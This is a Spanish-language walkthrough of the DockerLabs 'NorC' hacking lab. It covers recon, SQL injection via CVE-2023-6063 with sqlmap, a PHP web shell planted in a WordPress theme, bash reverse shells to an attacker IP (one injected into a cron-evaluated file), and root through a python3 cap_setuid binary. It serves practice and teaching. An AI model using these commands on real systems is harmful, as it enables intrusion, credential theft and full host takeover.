---
title: NorC
description: DockerLabs es una plataforma gratuita diseñada para practicar hacking ético al alcance de todo el mundo utilizando Docker. DockerLabs ofrece un entorno seguro y accesible para desplegar laboratorios vulnerables de la forma más eficiente y sencilla posible.
date: 2024-12-20
toc: true
pin: false
image:
 path: /assets/img/dockerlabs-writeup-norc/norc_logo.png
categories:
  - Docker Labs
tags:
  - linux
  - dockerlabs
  - fuzzing web
  - sqli
  - sqli blind
  - data leaks
  - wordpress
  - cron abuse
  - rce
  - cve
  - interactive tty
  - capabilities
  - ssh
  - http
  - tcp
  - information gathering
  - web analysis
  - cve exploitation
  - foothold
  - lateral movement
  - privilege escalation

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/dockerlabs/norc:-$ ping -c 1 127.17.0.2
PING 127.17.0.2 (127.17.0.2) 56(84) bytes of data.
64 bytes from 127.17.0.2: icmp_seq=1 ttl=64 time=0.041 ms

--- 127.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.041/0.041/0.041/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/dockerlabs/norc:-$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 127.17.0.2 -oG nmap1
Host: 127.17.0.2 ()     Status: Up
Host: 127.17.0.2 ()     Ports: 22/open/tcp//ssh///, 80/open/tcp//http///        Ignored State: closed (65533)
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/dockerlabs/norc:-$ sudo nmap -sCV -p22,80 127.17.0.2 -vvv -oN nmap2
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 8c:5c:7b:fe:79:92:7a:f9:85:ec:a5:b9:27:25:db:85 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMmh6zo2qJwVI4UxMDW0F0h65QQiTeqeQAEZR8ZA/sgZ7TQTlKQqc9CoX9vO0Wa7qMSCYjp2uzhvI/47bkd1zZY=
|   256 ba:69:95:e3:df:7e:42:ec:69:ed:74:9e:6b:f6:9a:06 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHRKCpUzCPrlMyI3AyRHrvzXKXJB4EngX+WZLgPZjwvJ
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.59 ((Debian))
|_http-title: Did not follow redirect to http://norc.labs/?password-protected=login&redirect_to=http%3A%2F%2Fpanel.mybb.dl%2F
|_http-server-header: Apache/2.4.59 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
```terminal
/home/kali/Documents/dockerlabs/norc:-$ echo '127.17.0.2\tnorc.labs' | sudo tee -a /etc/hosts
```
```terminal
/home/kali/Documents/dockerlabs/norc:-$ whatweb norc.labs
http://norc.labs [302 Found] Apache[2.4.59], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.59 (Debian)], IP[127.17.0.2], RedirectLocation[http://norc.labs/?password-protected=login&redirect_to=http%3A%2F%2Fnorc.labs%2F], Strict-Transport-Security[max-age=15768000;includeSubdomains], UncommonHeaders[x-redirect-by,content-security-policy], X-XSS-Protection[1; mode=block]
http://norc.labs/?password-protected=login&redirect_to=http%3A%2F%2Fnorc.labs%2F [200 OK] Apache[2.4.59], Cookies[wordpress_test_cookie], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.59 (Debian)], IP[127.17.0.2], PasswordField[password_protected_pwd], Script, Strict-Transport-Security[max-age=15768000;includeSubdomains], UncommonHeaders[content-security-policy], X-XSS-Protection[1; mode=block]
```

---
## Web Analysis

Me encuentro con una aplicación web con un campo para introducir una contraseña.

![](/assets/img/dockerlabs-writeup-norc/norc1_10.png)

Buscando archivos tipicos descubrí la existencia del archivo 'robots.txt'.

![](/assets/img/dockerlabs-writeup-norc/norc1_10-2.png)

El archivo menciona la presencia de wp-sitemap.xml, lo que indica que la aplicación utiliza WordPress como CMS.

Para profundizar en la enumeración, utilicé Dirsearch con un diccionario general y detecté varios recursos relacionados con WordPress.

```terminal
/home/kali/Documents/dockerlabs/norc:-$ dirsearch -u http://norc.labs/ -x 404,403
```
```terminal
/home/kali/Documents/dockerlabs/norc:-$ dirsearch -u http://norc.labs/ -w /usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt -x 404,403,405,401,409,500
```

Sin embargo, no detecté nada particularmente útil en esta etapa.

Al no encontrar rutas directamente explotables, decidí usar Nuclei para detectar vulnerabilidades conocidas en la aplicación.

```terminal
/home/kali/Documents/dockerlabs/norc:-$ nuclei -u http://norc.labs/
```

![](/assets/img/dockerlabs-writeup-norc/norc1_11.png)

---
## CVE Exploitation

El análisis identificó que el plugin WP Fastest Cache en la aplicación es vulnerable a [CVE-2023-6063](https://nvd.nist.gov/vuln/detail/CVE-2023-6063). Esta vulnerabilidad permite SQL Injection.

Este PoC muestra como explotar esta vulnerabilidad usando SQLMap.

<https://github.com/thesafdari/CVE-2023-6063>

```terminal
/home/kali/Documents/dockerlabs/norc:-$ sqlmap --dbms=mysql -u "http://norc.labs/wp-login.php" --cookie='wordpress_logged_in=*' --level=2 --schema --batch
```

![](/assets/img/dockerlabs-writeup-norc/norc1_12.png)

Encontré la tabla 'wp_users'. Detuve SQLMap y ajusté el comando para enfocar el ataque en esta tabla.

```terminal
/home/kali/Documents/dockerlabs/norc:-$ sqlmap --dbms=mysql -u "http://norc.labs/wp-login.php" --cookie='wordpress_logged_in=*' --level=2 -D wordpress -T wp_users --dump --batch
```

![](/assets/img/dockerlabs-writeup-norc/norc1_14.png)

Logré extraer información del usuario 'admin', incluida su contraseña en formato phpass. Este formato de hash es específico de WordPress. Intenté romperlo con Hashcat sin éxito.

```terminal
/home/kali/Documents/dockerlabs/norc:-$ hashcat --show '$P$BeNShJ/iBpuokTEP2/94.sLS8ejRo6.'
```

![](/assets/img/dockerlabs-writeup-norc/norc1_13.png)

Lo siguente fue investigar el subdominio 'oledockers.norc.labs'.

```terminal
/home/kali/Documents/dockerlabs/norc:-$ echo '127.17.0.2\tnorc.labs\toledockers.norc.labs' | sudo tee -a /etc/hosts
```

![](/assets/img/dockerlabs-writeup-norc/norc1_15.png)

En este subdominio encontré credenciales válidas para el usuario administrador ```admin:wWZvgxRz3jMBQ ZN```.

![](/assets/img/dockerlabs-writeup-norc/norc1_16.png)

---
## Foothold

Decidí intentar cargar código PHP malicioso en el archivo 'functions.php' del tema activo 'Twenty Twenty-Two'. Este método es común en WordPress para lograr RCE.

```php
system($_GET['cmd']);
```

![](/assets/img/dockerlabs-writeup-norc/norc1_17.png)

Navegando a ```http://norc.labs/wp-content/themes/twentytwentytwo/functions.php?cmd=id```. Confirmé que podía ejecutar comandos en el sistema.

![](/assets/img/dockerlabs-writeup-norc/norc1_18.png)

Para obtener una shell interactiva, configuré un listener en mi máquina.

```terminal
/home/kali/Documents/dockerlabs/norc:-$ nc -lnvp 1234
	listening on [any] 1234 ...
```

Luego utilicé una shell URL encodeada para consegir acceso remoto, ```http://norc.labs/wp-content/themes/twentytwentytwo/functions.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.0.171%2F1234%200%3E%261%22```.

![](/assets/img/dockerlabs-writeup-norc/norc1_19.png)

```terminal
	...connect to [192.168.0.171] from (UNKNOWN) [192.168.0.171] 39192

script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@kali:/var/www/norc$ ^Z
zsh: suspended  nc -lnvp 1234

/home/kali/Documents/dockerlabs/norc:-$ stty raw -echo;fg
[1]  + continued  nc -lnvp 1234
                               reset
reset: unknown terminal type unknown
Terminal type? xterm

www-data@kali:/var/www/norc$ export TERM=xterm
www-data@kali:/var/www/norc$ export SHELL=bash

/home/kali/Documents/dockerlabs/norc:-$ stty size
42 176

www-data@kali:/var/www/norc$ stty rows 42 columns 176

www-data@kali:/var/www/norc$ whoami
www-data
```

---
## Lateral Movement

```terminal
www-data@kali:/$ cat /etc/passwd | grep /bash$
root:x:0:0:root:/root:/bin/bash
kvzlx:x:1000:1000::/home/kvzlx:/bin/bash
```

Verifiqué las capacidades en binarios del sistema para encontrar posibles caminos de escalada.

```terminal
www-data@kali:/$ getcap -r / 2>/dev/null
/opt/python3 cap_setuid=ep
```

El binario '/opt/python3' tiene la capacidad 'cap_setuid=ep', lo que permite cambiar el ID de usuario. Sin embargo, al intentar usarlo, el sistema me negó el permiso.

<https://gtfobins.github.io/gtfobins/python/#capabilities>

![](/assets/img/dockerlabs-writeup-norc/norc1_24.png)

```terminal
www-data@kali:/home/kvzlx$ /opt/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
bash: /opt/python3: Permission denied
```

Pude acceder al directorio home del usuario 'kvzlx' y encontré un script que se ejecuta periódicamente '.cron_script.sh'

```terminal
www-data@kali:/home/kvzlx$ cat .cron_script.sh
```

![](/assets/img/dockerlabs-writeup-norc/norc1_25.png)

El uso de eval sin tratamiento adecuado en un script cron representa una vulnerabilidad crítica. Permite ejecutar comandos arbitrarios si se controla el contenido del archivo '/var/www/html/.wp-encrypted.txt'.

Para aprovechar esta vulnerabilidad, generé una reverse shell codificada en Base64 y la almacené en '/var/www/html/.wp-encrypted.txt'. Después, configuré un listener con Netcat en mi máquina para recibir la conexión.

```terminal
/home/kali/Documents/dockerlabs/norc:-$ nc -lvpn 4321
	listening on [any] 1234 ...

www-data@kali:/home/kvzlx$ echo "bash -c 'bash -i >& /dev/tcp/192.168.0.171/4321 0>&1'" | base64 >> /var/www/html/.wp-encrypted.txt
```

![](/assets/img/dockerlabs-writeup-norc/norc1_26.png)

Después de un tiempo, el script cron ejecutó mi reverse shell y obtuve acceso como 'kvzlx'

```
	...connect to [192.168.0.171] from (UNKNOWN) [192.168.0.171] 49976

kvzlx@kali:~$ whoami
kvzlx
```

---
## Privilege Escalation

Realicé el tratamiento de la TTY para mejorar la interacción con la shell.

```terminal
kvzlx@kali:~$ script /dev/null -c bash
Script started, output log file is '/dev/null'.
kvzlx@kali:/var/www/norc$ ^Z
zsh: suspended  nc -lnvp 1234

/home/kali/Documents/dockerlabs/norc:-$ stty raw -echo;fg
[1]  + continued  nc -lnvp 1234
                               reset
reset: unknown terminal type unknown
Terminal type? xterm

kvzlx@kali:/var/www/norc$ export TERM=xterm
kvzlx@kali:/var/www/norc$ export SHELL=bash

kvzlx@kali:/var/www/norc$ stty rows 42 columns 176
```

Revisé nuevamente las capacidades asignadas a los binarios del sistema. Y a diferencia del intento anterior como 'www-data', ahora puedo aprovechar esta capacidad con éxito.

```terminal
kvzlx@kali:~$ /sbin/getcap -r / 2>/dev/null
/opt/python3 cap_setuid=ep
kvzlx@kali:~$ /opt/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# id
uid=0(root) gid=1000(kvzlx) groups=1000(kvzlx)
```